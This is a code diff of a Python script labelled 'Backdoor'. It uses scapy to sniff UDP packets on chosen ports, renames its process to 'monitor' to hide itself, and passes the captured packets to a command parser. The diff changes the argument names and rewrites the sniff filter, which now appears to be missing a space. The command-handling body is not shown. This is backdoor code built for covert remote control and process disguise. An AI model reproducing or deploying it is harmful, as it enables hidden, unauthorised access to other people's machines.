@@ -4,10 +4,10 @@ from Crypto.Cipher import AES
 from scapy.layers.inet import IP, UDP
 
 parser = argparse.ArgumentParser(description="Backdoor")
-parser.add_argument('-d', '--dest', dest='dest', help='Destination IP', required=True)
-parser.add_argument('-p', '--port', dest='port', help='Destination Port', required=True)
-parser.add_argument('-s', '-source', dest='source_ip', help='Source IP', required=True)
-parser.add_argument('-sp', '-source_port', dest='source_port', help='Source Port', required= True)
+# parser.add_argument('-d', '--server_ip', dest='server_ip', help='Server IP', required=True)
+parser.add_argument('-p', '--server_port', dest='server_port', help='Server Port', required=True)
+# parser.add_argument('-s', '--client_ip', dest='client_ip', help='Client IP', required=True)
+parser.add_argument('-sp', '--client_port', dest='client_port', help='Client Port', required= True)
 args = parser.parse_args()
 
 
@@ -23,7 +23,7 @@ def parse_command(packet):
 
 def main():
     setproctitle.setproctitle("monitor")
-    sniff(filter="udp and dst port " + int(args.port) + and " src port " + int(args.source_port), prn=parse_command)
+    sniff(filter="udp and dst port " + args.server_port +  "and src port " + args.client_port, prn=parse_command)
 
 if __name__ == '__main__':
     main()
